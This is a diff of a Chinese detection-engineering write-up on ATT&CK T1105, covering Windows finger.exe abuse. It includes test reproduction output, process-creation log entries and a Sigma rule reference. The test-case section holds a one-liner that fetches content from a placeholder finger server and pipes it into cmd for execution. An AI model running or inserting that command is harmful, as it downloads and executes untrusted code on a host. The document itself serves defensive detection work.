@@ -5,29 +5,35 @@
 攻击者可能会将工具或其他文件从外部系统转移到被攻击的环境中。可以通过命令和控制通道从外部攻击者控制的系统复制文件，用以将工具带入被攻击的网络中，或通过其他工具（如 FTP）的替代协议。 也可以使用 scp、rsync 和 sftp等本地工具在Mac和 Linux上复制文件。
 
 ## 测试案例
+
 Finger.exe显示有关正在运行Finger服务或守护程序的指定远程计算机（通常是运行UNIX的计算机）上的一个或多个用户的信息。 远程计算机指定用户信息显示的格式和输出。 不带参数使用，手指显示帮助。
 
 **路径:**
-```
+
+```yml
 -   c:\windows\system32\finger.exe
 -   c:\windows\syswow64\finger.exe
 ```
 
 从远程Finger服务器下载有效载荷(Payload)。 此示例连接到“example.host.com”，询问用户“user”； 结果可能包含由cmd进程执行的恶意shellcode。
-```
+
+```yml
 finger user@example.host.com | more +2 | cmd
 ```
 
 用例：下载恶意负载
 所需权限：用户
 操作系统：Windows 8.1、Windows 10、Windows 11、Windows Server 2008、Windows Server 2008R2、Windows Server 2012、Windows Server 2012R2、Windows Server 2016、Windows Server 2019、Windows Server 2022
+
 ## 检测日志
 
 windows安全日志
 
 ## 测试复现
+
 Windows 10 测试
-```
+
+```yml
 C:\Users\liyang>Finger.exe
 
 显示与运行手指服务的指定系统上某个用户有关
@@ -46,6 +52,7 @@ Microsoft Windows [版本 10.0.18363.418]
 ```
 
 ## 测试留痕
+
 ```log
 已创建新进程。
 
@@ -91,8 +98,11 @@ Microsoft Windows [版本 10.0.18363.418]
 
 进程命令行: finger  user@example.host.com
 ```
+
 ## 检测方法/思路
+
 参考Sigma官方规则:
+
 ```yml
 title: Finger.exe Suspicious Invocation
 
@@ -140,7 +150,9 @@ level: high
 ```
 
 ### 建议
+
 从Sigma给出的规则来看，更多的是对进程和命令行参数进行监测，只要出现其中一个命令参数即告警。
+
 ## 参考推荐
 
 MITRE-ATT&CK-T1105
